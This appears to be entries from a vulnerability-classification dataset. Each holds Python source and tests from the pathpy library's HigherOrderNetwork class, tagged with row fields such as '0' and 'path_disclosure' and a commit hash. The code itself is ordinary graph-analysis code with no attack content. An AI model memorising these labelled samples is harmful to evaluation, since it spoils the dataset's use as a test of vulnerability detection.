    def getDistanceMatrixFirstOrder(self):
        """"""
        Projects a distance matrix from a higher-order to
        first-order nodes, while path lengths are calculated
        based on the higher-order topology
        """"""

        dist = self.getDistanceMatrix()
        dist_first = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))

        # calculate distances between first-order nodes based on distance in higher-order topology
        for vk in dist:
            for wk in dist[vk]:
                v1 = self.HigherOrderNodeToPath(vk)[0]
                w1 = self.HigherOrderNodeToPath(wk)[-1]
                if dist[vk][wk] + self.order-1 < dist_first[v1][w1]:
                    dist_first[v1][w1] = dist[vk][wk] + self.order - 1

        return dist_first


    def HigherOrderPathToFirstOrder(self, path):
        """"""
        Maps a path in the higher-order network
        to a path in the first-order network. As an
        example, the second-order path ('a-b', 'b-c', 'c-d')
        of length two is mapped to the first-order path ('a','b','c','d')
        of length four. In general, a path of length l in a network of
        order k is mapped to a path of length l+k-1 in the first-order network.

        @param path: The higher-order path that shall be mapped to the first-order network
        """"""
        p1 = self.HigherOrderNodeToPath(path[0])
        for x in path[1:]:
            p1 += (self.HigherOrderNodeToPath(x)[-1],)
        return p1    


    def reduceToGCC(self):
        """"""
        Reduces the higher-order network to its
        largest (giant) strongly connected component
        (using Tarjan's algorithm)
        """"""

        # nonlocal variables (!)
        index = 0
        S = []
        indices = _co.defaultdict(lambda: None)
        lowlink = _co.defaultdict(lambda: None)
        onstack = _co.defaultdict(lambda: False)

        # Tarjan's algorithm
        def strong_connect(v):
            nonlocal index
            nonlocal S
            nonlocal indices
            nonlocal lowlink
            nonlocal onstack

            indices[v] = index
            lowlink[v] = index
            index += 1
            S.append(v)
            onstack[v] = True

            for w in self.successors[v]:
                if indices[w] == None:
                    strong_connect(w)
                    lowlink[v] = min(lowlink[v], lowlink[w])
                elif onstack[w]:
                    lowlink[v] = min(lowlink[v], indices[w])

            # Generate SCC of node v
            component = set()
            if lowlink[v] == indices[v]:
                while True:
                    w = S.pop()
                    onstack[w] = False
                    component.add(w)
                    if v == w:
                        break
            return component

        # Get largest strongly connected component
        components = _co.defaultdict(lambda: set())
        max_size = 0
        max_head = None
        for v in self.nodes:
            if indices[v] == None:
                components[v] = strong_connect(v)
                if len(components[v]) > max_size:
                    max_head = v
                    max_size = len(components[v])

        scc = components[max_head]

        # Reduce higher-order network to SCC
        for v in list(self.nodes):
            if v not in scc:
                self.nodes.remove(v)
                del self.successors[v]

        for (v, w) in list(self.edges):
            if v not in scc or w not in scc:
                del self.edges[(v, w)]


    def summary(self):
        """"""
        Returns a string containing basic summary statistics
        of this higher-order graphical model instance
        """"""

        summary = 'Graphical model of order k = ' + str(self.order)
        summary += '\n'
        summary += 'Nodes:\t\t\t\t' +  str(self.vcount()) + '\n'
        summary += 'Links:\t\t\t\t' + str(self.ecount()) + '\n'
        summary += 'Total weight (sub/longest):\t' + str(self.totalEdgeWeight()[0]) + '/' + str(self.totalEdgeWeight()[1]) + '\n'
        return summary


    def __str__(self):
        """"""
        Returns the default string representation of
        this graphical model instance
        """"""
        return self.summary()


    def getAdjacencyMatrix(self, includeSubPaths=True, weighted=True, transposed=False):
        """"""
        Returns a sparse adjacency matrix of the higher-order network. By default, the entry
            corresponding to a directed link source -> target is stored in row s and column t
            and can be accessed via A[s,t].

        @param includeSubPaths: if set to True, the returned adjacency matrix will
            account for the occurrence of links of order k (i.e. paths of length k-1)
            as subpaths

        @param weighted: if set to False, the function returns a binary adjacency matrix.
          If set to True, adjacency matrix entries will contain the weight of an edge.

        @param transposed: whether to transpose the matrix or not.
        """"""

        row = []
        col = []
        data = []

        if transposed:
            for s, t in self.edges:
                row.append(self.nodes.index(t))
                col.append(self.nodes.index(s))
        else:
            for s, t in self.edges:
                row.append(self.nodes.index(s))
                col.append(self.nodes.index(t))

        # create array with non-zero entries
        if not weighted:
            data = _np.ones(len(self.edges.keys()))
        else:
            if includeSubPaths:
                data = _np.array([float(x.sum()) for x in self.edges.values()])
            else:
                data = _np.array([float(x[1]) for x in self.edges.values()])

        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()


    def getTransitionMatrix(self, includeSubPaths=True):
        """"""
        Returns a (transposed) random walk transition matrix
        corresponding to the higher-order network.

        @param includeSubpaths: whether or not to include subpath statistics in the
            transition probability calculation (default True)
        """"""
        row = []
        col = []
        data = []
        # calculate weighted out-degrees (with or without subpaths)
        if includeSubPaths:
            D = [ self.outweights[x].sum() for x in self.nodes]
        else:
            D = [ self.outweights[x][1] for x in self.nodes]
                
        for (s, t) in self.edges:
            # either s->t has been observed as a longest path, or we are interested in subpaths as well

            # the following makes sure that we do not accidentially consider zero-weight edges (automatically added by default_dic)
            if (self.edges[(s, t)][1] > 0) or (includeSubPaths and self.edges[(s, t)][0] > 0):
                row.append(self.nodes.index(t))
                col.append(self.nodes.index(s))
                if includeSubPaths:
                    count = self.edges[(s, t)].sum()
                else:
                    count = self.edges[(s, t)][1]
                assert D[self.nodes.index(s)] > 0, 'Encountered zero out-degree for node ' + str(s) + ' while weight of link (' + str(s) +  ', ' + str(t) + ') is non-zero.'
                prob = count / D[self.nodes.index(s)]
                if prob < 0 or prob > 1:
                    tn.Log.add('Encountered transition probability outside [0,1] range.', Severity.ERROR)
                    raise ValueError()
                data.append(prob)

        data = _np.array(data)
        data = data.reshape(data.size,)

        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()


    @staticmethod
    def getLeadingEigenvector(A, normalized=True, lanczosVecs=15, maxiter=1000):
        """"""Compute normalized leading eigenvector of a given matrix A.

        @param A: sparse matrix for which leading eigenvector will be computed
        @param normalized: wheter or not to normalize. Default is C{True}
        @param lanczosVecs: number of Lanczos vectors to be used in the approximate
            calculation of eigenvectors and eigenvalues. This maps to the ncv parameter
            of scipy's underlying function eigs.
        @param maxiter: scaling factor for the number of iterations to be used in the
            approximate calculation of eigenvectors and eigenvalues. The number of iterations
            passed to scipy's underlying eigs function will be n*maxiter where n is the
            number of rows/columns of the Laplacian matrix.
        """"""

        if _sparse.issparse(A) == False:
            raise TypeError(""A must be a sparse matrix"")

        # NOTE: ncv sets additional auxiliary eigenvectors that are computed
        # NOTE: in order to be more confident to find the one with the largest
        # NOTE: magnitude, see https://github.com/scipy/scipy/issues/4987
        w, pi = _sla.eigs(A, k=1, which=""LM"", ncv=lanczosVecs, maxiter=maxiter)
        pi = pi.reshape(pi.size,)
        if normalized:
            pi /= sum(pi)
        return pi


    def getLaplacianMatrix(self, includeSubPaths=True):
        """"""
        Returns the transposed Laplacian matrix corresponding to the higher-order network.

        @param includeSubpaths: Whether or not subpath statistics shall be included in the
            calculation of matrix weights
        """"""

        T = self.getTransitionMatrix(includeSubPaths)
        I = _sparse.identity(self.vcount())

        return I-T
/n/n/ntests/test_HigherOrderNetwork.py/n/n# -*- coding: utf-8 -*-
""""""
    pathpy is an OpenSource python package for the analysis of sequential data
    on pathways and temporal networks using higher- and multi order graphical models

    Copyright (C) 2016-2017 Ingo Scholtes, ETH Zürich

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    Contact the developer:

    E-mail: ischoltes@ethz.ch
    Web:    http://www.ingoscholtes.net
""""""

import pathpy as pp
import pytest
import numpy as np


slow = pytest.mark.slow


def test_degrees(path_from_edge_file):
    hon_1 = pp.HigherOrderNetwork(path_from_edge_file, k=1)
    expected_degrees = {'1': 52, '2' : 0, '3': 2, '5': 5}
    for v in hon_1.nodes:
        assert expected_degrees[v] == hon_1.outweights[v][1], \
        ""Wrong degree calculation in HigherOrderNetwork""


def test_distance_matrix(path_from_edge_file):
    p = path_from_edge_file
    hon = pp.HigherOrderNetwork(paths=p, k=1)
    d_matrix = hon.getDistanceMatrix()
    distances = []
    for source in sorted(d_matrix):
        for target in sorted(d_matrix[source]):
            distance = d_matrix[source][target]
            if distance < 1e6:
                distances.append(d_matrix[source][target])

    assert np.sum(distances) == 8
    assert np.min(distances) == 0
    assert np.max(distances) == 2


def test_distance_matrix_equal_across_objects(random_paths):
    p1 = random_paths(40, 20, num_nodes=9)
    p2 = random_paths(40, 20, num_nodes=9)
    hon1 = pp.HigherOrderNetwork(paths=p1, k=1)
    hon2 = pp.HigherOrderNetwork(paths=p2, k=1)
    d_matrix1 = hon1.getDistanceMatrix()
    d_matrix2 = hon2.getDistanceMatrix()
    assert d_matrix1 == d_matrix2


@pytest.mark.parametrize('paths,n_nodes,k,e_var,e_sum', (
        (7, 9, 1, 0.7911428035, 123),
        (20, 9, 1, 0.310318549, 112),
        (60, 20, 1, 0.2941, 588),
))
def test_distance_matrix_large(random_paths, paths, n_nodes, k, e_var, e_sum):
    p = random_paths(paths, 20, num_nodes=n_nodes)
    hon = pp.HigherOrderNetwork(paths=p, k=1)
    d_matrix = hon.getDistanceMatrix()
    distances = []
    for i, source in enumerate(sorted(d_matrix)):
        for j, target in enumerate(sorted(d_matrix[source])):
            distance = d_matrix[source][target]
            if distance < 1e16:
                distances.append(d_matrix[source][target])

    assert np.var(distances) == pytest.approx(e_var)
    assert np.sum(distances) == e_sum


def test_shortest_path_length(random_paths):
    N = 10
    p = random_paths(20, 10, N)
    hon = pp.HigherOrderNetwork(p, k=1)
    shortest_paths = hon.getShortestPaths()
    distances = np.zeros(shape=(N, N))
    for i, source in enumerate(sorted(shortest_paths)):
        for j, target in enumerate(sorted(shortest_paths[source])):
            distances[i][j] = len(shortest_paths[source][target])
    assert np.mean(distances) == 1.47
    assert np.var(distances) == pytest.approx(0.4891)
    assert np.max(distances) == 4


def test_node_name_map(random_paths):
    p = random_paths(20, 10, 20)
    hon = pp.HigherOrderNetwork(p, k=1)
    node_map = hon.getNodeNameMap()
    # TODO: this is just an idea of how the mapping could be unique
    assert node_map == {str(i): i+1 for i in range(20)}
/n/n/n",0,path_disclosure
7,163,13360e223925e21d02d6132d342c47fe53abc994,"/pathpy/HigherOrderNetwork.py/n/n# -*- coding: utf-8 -*-
""""""
    pathpy is an OpenSource python package for the analysis of time series data
    on networks using higher- and multi order graphical models.

    Copyright (C) 2016-2017 Ingo Scholtes, ETH Zürich

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    Contact the developer:

    E-mail: ischoltes@ethz.ch
    Web:    http://www.ingoscholtes.net
""""""

import collections as _co
import bisect as _bs
import itertools as _iter

import numpy as _np

import scipy.sparse as _sparse
import scipy.sparse.linalg as _sla
import scipy.linalg as _la
import scipy as _sp

from pathpy.Log import Log
from pathpy.Log import Severity


class EmptySCCError(Exception):
    """"""
    This exception is thrown whenever a non-empty strongly
    connected component is needed, but we encounter an empty one
    """"""
    pass


class HigherOrderNetwork:
    """"""
    Instances of this class capture a k-th-order representation
    of path statistics. Path statistics can originate from pathway
    data, temporal networks, or from processes observed on top
    of a network topology.
    """"""


    def __init__(self, paths, k=1, separator='-', nullModel=False,
        method='FirstOrderTransitions', lanczosVecs=15, maxiter=1000):
        """"""
        Generates a k-th-order representation based on the given path statistics.

        @param paths: An instance of class Paths, which contains the path
            statistics to be used in the generation of the k-th order
            representation

        @param k: The order of the network representation to generate.
            For the default case of k=1, the resulting representation
            corresponds to the usual (first-order) aggregate network,
            i.e. links connect nodes and link weights are given by the
            frequency of each interaction. For k>1, a k-th order node
            corresponds to a sequence of k nodes. The weight of a k-th
            order link captures the frequency of a path of length k.

        @param separator: The separator character to be used in
            higher-order node names.

        @param nullModel: For the default value False, link weights are
            generated based on the statistics of paths of length k in the
            underlying path statistics instance. If True, link weights are
            generated from the first-order model (k=1) based on the assumption
            of independent links (i.e. corresponding) to a first-order
            Markov model.

        @param method: specifies how the null model link weights
            in the k-th order model are calculated. For the default
            method='FirstOrderTransitions', the weight
            w('v_1-v_2-...v_k', 'v_2-...-v_k-v_k+1') of a k-order edge
            is set to the transition probability T['v_k', 'v_k+1'] in the
            first order network. For method='KOrderPi' the entry
            pi['v1-...-v_k'] in the stationary distribution of the
            k-order network is used instead.
        """"""

        assert not nullModel or (nullModel and k > 1)

        assert method == 'FirstOrderTransitions' or method == 'KOrderPi', \
            'Error: unknown method to build null model'

        assert paths.paths.keys() and max(paths.paths.keys()) >= k, \
            'Error: constructing a model of order k requires paths of at least length k'

        ## The order of this HigherOrderNetwork
        self.order = k

        ## The paths object used to generate this instance
        self.paths = paths

        ## The nodes in this HigherOrderNetwork
        self.nodes = []

        ## The separator character used to label higher-order nodes.
        ## For separator '-', a second-order node will be 'a-b'.
        self.separator = separator

        ## A dictionary containing the sets of successors of all nodes
        self.successors = _co.defaultdict(lambda: set())

        ## A dictionary containing the sets of predecessors of all nodes
        self.predecessors = _co.defaultdict(lambda: set())

        ## A dictionary containing the out-degrees of all nodes
        self.outdegrees = _co.defaultdict(lambda: 0.0)

        ## A dictionary containing the in-degrees of all nodes
        self.indegrees = _co.defaultdict(lambda: 0.0)

        # NOTE: edge weights, as well as in- and out weights of nodes are 
        # numpy arrays consisting of two weight components [w0, w1]. w0 
        # counts the weight of an edge based on its occurrence in a subpaths 
        # while w1 counts the weight of an edge based on its occurrence in 
        # a longest path. As an illustrating example, consider the single 
        # path a -> b -> c. In the first-order network, the weights of edges 
        # (a,b) and (b,c) are both (1,0). In the second-order network, the 
        # weight of edge (a-b, b-c) is (0,1).

        ## A dictionary containing edges as well as edge weights
        self.edges = _co.defaultdict(lambda: _np.array([0., 0.]))

        ## A dictionary containing the weighted in-degrees of all nodes
        self.inweights = _co.defaultdict(lambda: _np.array([0., 0.]))        

        ## A dictionary containing the weighted out-degrees of all nodes
        self.outweights = _co.defaultdict(lambda: _np.array([0., 0.]))        

        if k > 1:
            # For k>1 we need the first-order network to generate the null model
            # and calculate the degrees of freedom

            # For a multi-order model, the first-order network is generated multiple times!
            # TODO: Make this more efficient
            g1 = HigherOrderNetwork(paths, k=1)
            A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)

        if not nullModel:
            # Calculate the frequency of all paths of
            # length k, generate k-order nodes and set
            # edge weights accordingly
            node_set = set()
            iterator = paths.paths[k].items()

            if k==0:
                # For a 0-order model, we generate a dummy start node
                node_set.add('start')
                for key, val in iterator:
                    w = key[0]
                    node_set.add(w)
                    self.edges[('start',w)] += val
                    self.successors['start'].add(w)
                    self.predecessors[w].add('start')
                    self.indegrees[w] = len(self.predecessors[w])
                    self.inweights[w] += val
                    self.outdegrees['start'] = len(self.successors['start'])
                    self.outweights['start'] += val
            else:
                for key, val in iterator:
                    # Generate names of k-order nodes v and w
                    v = separator.join(key[0:-1]) 
                    w = separator.join(key[1:])
                    node_set.add(v)
                    node_set.add(w)
                    self.edges[(v,w)] += val
                    self.successors[v].add(w)
                    self.predecessors[w].add(v)
                    self.indegrees[w] = len(self.predecessors[w])
                    self.inweights[w] += val
                    self.outdegrees[v] = len(self.successors[v])
                    self.outweights[v] += val

            self.nodes = list(node_set)

            # Note: For all sequences of length k which (i) have never been observed, but
            #       (ii) do actually represent paths of length k in the first-order network,
            #       we may want to include some 'escape' mechanism along the
            #       lines of (Cleary and Witten 1994)

        else:
            # generate the *expected* frequencies of all possible
            # paths based on independently occurring (first-order) links

            # generate all possible paths of length k
            # based on edges in the first-order network
            possiblePaths = list(g1.edges.keys())

            for _ in range(k-1):
                E_new = list()
                for e1 in possiblePaths:
                    for e2 in g1.edges:
                        if e1[-1] == e2[0]:
                            p = e1 + (e2[1],)
                            E_new.append(p)
                possiblePaths = E_new

            # validate that the number of unique generated paths corresponds to the sum of entries in A**k
            assert (A**k).sum() == len(possiblePaths), 'Expected ' + str((A**k).sum()) + \
                ' paths but got ' + str(len(possiblePaths))

            if method == 'KOrderPi':
                # compute stationary distribution of a random walker in the k-th order network
                g_k = HigherOrderNetwork(paths, k=k, separator=separator, nullModel=False)
                pi_k = HigherOrderNetwork.getLeadingEigenvector(g_k.getTransitionMatrix(includeSubPaths=True),
                                                                normalized=True, lanczosVecs=lanczosVecs, maxiter=maxiter)
            else:
                # A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=True, transposed=False)
                T = g1.getTransitionMatrix(includeSubPaths=True)

            # assign link weights in k-order null model
            for p in possiblePaths:
                v = p[0]
                # add k-order nodes and edges
                for l in range(1, k):
                    v = v + separator + p[l]
                w = p[1]
                for l in range(2, k+1):
                    w = w + separator + p[l]
                if v not in self.nodes:
                    self.nodes.append(v)
                if w not in self.nodes:
                    self.nodes.append(w)

                # NOTE: under the null model's assumption of independent events, we
                # have P(B|A) = P(A ^ B)/P(A) = P(A)*P(B)/P(A) = P(B)
                # In other words: we are encoding a k-1-order Markov process in a k-order
                # Markov model and for the transition probabilities T_AB in the k-order model
                # we simply have to set the k-1-order probabilities, i.e. T_AB = P(B)

                # Solution A: Use entries of stationary distribution,
                # which give stationary visitation frequencies of k-order node w
                if method == 'KOrderPi':
                    self.edges[(v, w)] = _np.array([0, pi_k[g_k.nodes.index(w)]])

                # Solution B: Use relative edge weight in first-order network
                # Note that A is *not* transposed
                # self.edges[(v,w)] = A[(g1.nodes.index(p[-2]),g1.nodes.index(p[-1]))] / A.sum()

                # Solution C: Use transition probability in first-order network
                # Note that T is transposed (!)
                elif method == 'FirstOrderTransitions':
                    p_vw = T[(g1.nodes.index(p[-1]), g1.nodes.index(p[-2]))]
                    self.edges[(v, w)] = _np.array([0, p_vw])

                # Solution D: calculate k-path weights based on entries of squared k-1-order adjacency matrix

                # Note: Solution B and C are equivalent
                self.successors[v].add(w)
                self.indegrees[w] = len(self.predecessors[w])
                self.inweights[w] += self.edges[(v, w)]
                self.outdegrees[v] = len(self.successors[v])
                self.outweights[v] += self.edges[(v, w)]

        # Compute degrees of freedom of models
        if k == 0:
            # for a zero-order model, we just fit node probabilities
            # (excluding the special 'start' node)
            # Since probabilities must sum to one, the effective degree
            # of freedom is one less than the number of nodes
            # This holds for both the paths and the ngrams model
            self.dof_paths = self.vcount() - 2
            self.dof_ngrams = self.vcount() - 2
        else:
            # for a first-order model, self is the first-order network
            if k == 1:
                g1 = self
                A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)

            # Degrees of freedom in a higher-order ngram model
            s = g1.vcount()

            ## The degrees of freedom of the higher-order model, under the ngram assumption
            self.dof_ngrams = (s**k)*(s-1)

            # For k>0, the degrees of freedom of a path-based model depend on
            # the number of possible paths of length k in the first-order network.
            # Since probabilities in each row must sum to one, the degrees
            # of freedom must be reduced by one for each k-order node
            # that has at least one possible transition.

            # (A**k).sum() counts the number of different paths of exactly length k
            # based on the first-order network, which corresponds to the number of
            # possible transitions in the transition matrix of a k-th order model.
            paths_k = (A**k).sum()

            # For the degrees of freedom, we must additionally consider that
            # rows in the transition matrix must sum to one, i.e. we have to
            # subtract one degree of freedom for every non-zero row in the (null-model)
            # transition matrix. In other words, we subtract one for every path of length k-1
            # that can possibly be followed by at least one edge to a path of length k

            # This can be calculated by counting the number of non-zero elements in the
            # vector containing the row sums of A**k
            non_zero = _np.count_nonzero((A**k).sum(axis=0))

            ## The degrees of freedom of the higher-order model, under the paths assumption
            self.dof_paths = paths_k - non_zero


    def vcount(self):
        """""" Returns the number of nodes """"""
        return len(self.nodes)


    def ecount(self):
        """""" Returns the number of links """"""
        return len(self.edges)


    def totalEdgeWeight(self):
        """""" Returns the sum of all edge weights """"""
        if self.edges:
            return sum(self.edges.values())
        return _np.array([0, 0])


    def modelSize(self):
        """"""
        Returns the number of non-zero elements in the adjacency matrix
        of the higher-order model.
        """"""
        return self.getAdjacencyMatrix().count_nonzero()


    def HigherOrderNodeToPath(self, node):
        """"""
        Helper function that transforms a node in a
        higher-order network of order k into a corresponding
        path of length k-1. For a higher-order node 'a-b-c-d'
        this function will return ('a','b','c','d')

        @param node: The higher-order node to be transformed to a path.
        """"""
        return tuple(node.split(self.separator))


    def pathToHigherOrderNodes(self, path, k=None):
        """"""
        Helper function that transforms a path into a sequence of k-order nodes
        using the separator character of the HigherOrderNetwork instance

        Consider an example path (a,b,c,d) with a separator string '-'
        For k=1, the output will be the list of strings ['a', 'b', 'c', 'd']
        For k=2, the output will be the list of strings ['a-b', 'b-c', 'c-d']
        For k=3, the output will be the list of strings ['a-b-c', 'b-c-d']
        etc.

        @param path: the path tuple to turn into a sequence of higher-order nodes

        @param k: the order of the representation to use (default: order of the
            HigherOrderNetwork instance)
        """"""
        if k is None:
            k = self.order
        assert len(path) > k, 'Error: Path must be longer than k'

        if k == 0 and len(path) == 1:
            return ['start', path[0]]

        return [self.separator.join(path[n:n+k]) for n in range(len(path)-k+1)]


    def getNodeNameMap(self):
        """"""
        Returns a dictionary that can be used to map
        nodes to matrix/vector indices
        """"""

        name_map = {}
        for idx, v in enumerate(self.nodes):
            name_map[v] = idx
        return name_map


    def getDoF(self, assumption=""paths""):
        """"""
        Calculates the degrees of freedom (i.e. number of parameters) of
        this k-order model. Depending on the modeling assumptions, this either
        corresponds to the number of paths of length k in the first-order network
        or to the number of all possible k-grams. The degrees of freedom of a model
        can be used to assess the model complexity when calculating, e.g., the
        Bayesian Information Criterion (BIC).

        @param assumption: if set to 'paths', for the degree of freedon calculation in the BIC,
            only paths in the first-order network topology will be considered. This is
            needed whenever we are interested in a modeling of paths in a given network topology.
            If set to 'ngrams' all possible n-grams will be considered, independent of whether they
            are valid paths in the first-order network or not. The 'ngrams'
            and the 'paths' assumption coincide if the first-order network is fully connected.
        """"""
        assert assumption == 'paths' or assumption == 'ngrams', 'Error: Invalid assumption'

        if assumption == 'paths':
            return self.dof_paths
        return self.dof_ngrams


    def getDistanceMatrix(self):
        """"""
        Calculates shortest path distances between all pairs of
        higher-order nodes using the Floyd-Warshall algorithm.
        """"""

        Log.add('Calculating distance matrix in higher-order network (k = ' +
                str(self.order) + ') ...', Severity.INFO)

        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))

        for v in self.nodes:
            dist[v][v] = 0

        for e in self.edges:
            dist[e[0]][e[1]] = 1

        for k in self.nodes:
            for v in self.nodes:
                for w in self.nodes:
                    if dist[v][w] > dist[v][k] + dist[k][w]:
                        dist[v][w] = dist[v][k] + dist[k][w]

        Log.add('finished.', Severity.INFO)

        return dist


    def getShortestPaths(self):
        """"""
        Calculates all shortest paths between all pairs of
        higher-order nodes using the Floyd-Warshall algorithm.
        """"""

        Log.add('Calculating shortest paths in higher-order network (k = ' +
                str(self.order) + ') ...', Severity.INFO)

        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))
        shortest_paths = _co.defaultdict(lambda: _co.defaultdict(lambda: set()))

        for e in self.edges:
            dist[e[0]][e[1]] = 1
            shortest_paths[e[0]][e[1]].add(e)

        for v in self.nodes:
            for w in self.nodes:
                if v != w:
                    for k in self.nodes:
                        if dist[v][w] > dist[v][k] + dist[k][w]:
                            dist[v][w] = dist[v][k] + dist[k][w]
                            shortest_paths[v][w] = set()
                            for p in list(shortest_paths[v][k]):
                                for q in list(shortest_paths[k][w]):
                                    shortest_paths[v][w].add(p+q[1:])
                        elif dist[v][w] == dist[v][k] + dist[k][w]:
                            for p in list(shortest_paths[v][k]):
                                for q in list(shortest_paths[k][w]):
                                    shortest_paths[v][w].add(p+q[1:])

        for v in self.nodes:
            dist[v][v] = 0
            shortest_paths[v][v].add((v,))

        Log.add('finished.', Severity.INFO)

        return shortest_paths


    def getDistanceMatrixFirstOrder(self):
        """"""
        Projects a distance matrix from a higher-order to
        first-order nodes, while path lengths are calculated
        based on the higher-order topology
        """"""

        dist = self.getDistanceMatrix()
        dist_first = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))

        # calculate distances between first-order nodes based on distance in higher-order topology
        for vk in dist:
            for wk in dist[vk]:
                v1 = self.HigherOrderNodeToPath(vk)[0]
                w1 = self.HigherOrderNodeToPath(wk)[-1]
                if dist[vk][wk] + self.order-1 < dist_first[v1][w1]:
                    dist_first[v1][w1] = dist[vk][wk] + self.order - 1

        return dist_first


    def HigherOrderPathToFirstOrder(self, path):
        """"""
        Maps a path in the higher-order network
        to a path in the first-order network. As an
        example, the second-order path ('a-b', 'b-c', 'c-d')
        of length two is mapped to the first-order path ('a','b','c','d')
        of length four. In general, a path of length l in a network of
        order k is mapped to a path of length l+k-1 in the first-order network.

        @param path: The higher-order path that shall be mapped to the first-order network
        """"""
        p1 = self.HigherOrderNodeToPath(path[0])
        for x in path[1:]:
            p1 += (self.HigherOrderNodeToPath(x)[-1],)
        return p1    


    def reduceToGCC(self):
        """"""
        Reduces the higher-order network to its
        largest (giant) strongly connected component
        (using Tarjan's algorithm)
        """"""

        # nonlocal variables (!)
        index = 0
        S = []
        indices = _co.defaultdict(lambda: None)
        lowlink = _co.defaultdict(lambda: None)
        onstack = _co.defaultdict(lambda: False)

        # Tarjan's algorithm
        def strong_connect(v):
            nonlocal index
            nonlocal S
            nonlocal indices
            nonlocal lowlink
            nonlocal onstack

            indices[v] = index
            lowlink[v] = index
            index += 1
            S.append(v)
            onstack[v] = True

            for w in self.successors[v]:
                if indices[w] == None:
                    strong_connect(w)
                    lowlink[v] = min(lowlink[v], lowlink[w])
                elif onstack[w]:
                    lowlink[v] = min(lowlink[v], indices[w])

            # Generate SCC of node v
            component = set()
            if lowlink[v] == indices[v]:
                while True:
                    w = S.pop()
                    onstack[w] = False
                    component.add(w)
                    if v == w:
                        break
            return component

        # Get largest strongly connected component
        components = _co.defaultdict(lambda: set())
        max_size = 0
        max_head = None
        for v in self.nodes:
            if indices[v] == None:
                components[v] = strong_connect(v)
                if len(components[v]) > max_size:
                    max_head = v
                    max_size = len(components[v])

        scc = components[max_head]

        # Reduce higher-order network to SCC
        for v in list(self.nodes):
            if v not in scc:
                self.nodes.remove(v)
                del self.successors[v]

        for (v, w) in list(self.edges):
            if v not in scc or w not in scc:
                del self.edges[(v, w)]


    def summary(self):
        """"""
        Returns a string containing basic summary statistics
        of this higher-order graphical model instance
        """"""

        summary = 'Graphical model of order k = ' + str(self.order)
        summary += '\n'
        summary += 'Nodes:\t\t\t\t' +  str(self.vcount()) + '\n'
        summary += 'Links:\t\t\t\t' + str(self.ecount()) + '\n'
        summary += 'Total weight (sub/longest):\t' + str(self.totalEdgeWeight()[0]) + '/' + str(self.totalEdgeWeight()[1]) + '\n'
        return summary


    def __str__(self):
        """"""
        Returns the default string representation of
        this graphical model instance
        """"""
        return self.summary()


    def getAdjacencyMatrix(self, includeSubPaths=True, weighted=True, transposed=False):
        """"""
        Returns a sparse adjacency matrix of the higher-order network. By default, the entry
            corresponding to a directed link source -> target is stored in row s and column t
            and can be accessed via A[s,t].

        @param includeSubPaths: if set to True, the returned adjacency matrix will
            account for the occurrence of links of order k (i.e. paths of length k-1)
            as subpaths

        @param weighted: if set to False, the function returns a binary adjacency matrix.
          If set to True, adjacency matrix entries will contain the weight of an edge.

        @param transposed: whether to transpose the matrix or not.
        """"""

        row = []
        col = []
        data = []

        if transposed:
            for s, t in self.edges:
                row.append(self.nodes.index(t))
                col.append(self.nodes.index(s))
        else:
            for s, t in self.edges:
                row.append(self.nodes.index(s))
                col.append(self.nodes.index(t))

        # create array with non-zero entries
        if not weighted:
            data = _np.ones(len(self.edges.keys()))
        else:
            if includeSubPaths:
                data = _np.array([float(x.sum()) for x in self.edges.values()])
            else:
                data = _np.array([float(x[1]) for x in self.edges.values()])

        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()


    def getTransitionMatrix(self, includeSubPaths=True):
        """"""
        Returns a (transposed) random walk transition matrix
        corresponding to the higher-order network.

        @param includeSubpaths: whether or not to include subpath statistics in the
            transition probability calculation (default True)
        """"""
        row = []
        col = []
        data = []
        # calculate weighted out-degrees (with or without subpaths)
        if includeSubPaths:
            D = [ self.outweights[x].sum() for x in self.nodes]
        else:
            D = [ self.outweights[x][1] for x in self.nodes]
                
        for (s, t) in self.edges:
            # either s->t has been observed as a longest path, or we are interested in subpaths as well

            # the following makes sure that we do not accidentially consider zero-weight edges (automatically added by default_dic)
            if (self.edges[(s, t)][1] > 0) or (includeSubPaths and self.edges[(s, t)][0] > 0):
                row.append(self.nodes.index(t))
                col.append(self.nodes.index(s))
                if includeSubPaths:
                    count = self.edges[(s, t)].sum()
                else:
                    count = self.edges[(s, t)][1]
                assert D[self.nodes.index(s)] > 0, 'Encountered zero out-degree for node ' + str(s) + ' while weight of link (' + str(s) +  ', ' + str(t) + ') is non-zero.'
                prob = count / D[self.nodes.index(s)]
                if prob < 0 or prob > 1:
                    tn.Log.add('Encountered transition probability outside [0,1] range.', Severity.ERROR)
                    raise ValueError()
                data.append(prob)

        data = _np.array(data)
        data = data.reshape(data.size,)

        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()


    @staticmethod
    def getLeadingEigenvector(A, normalized=True, lanczosVecs=15, maxiter=1000):
        """"""Compute normalized leading eigenvector of a given matrix A.

        @param A: sparse matrix for which leading eigenvector will be computed
        @param normalized: wheter or not to normalize. Default is C{True}
        @param lanczosVecs: number of Lanczos vectors to be used in the approximate
            calculation of eigenvectors and eigenvalues. This maps to the ncv parameter
            of scipy's underlying function eigs.
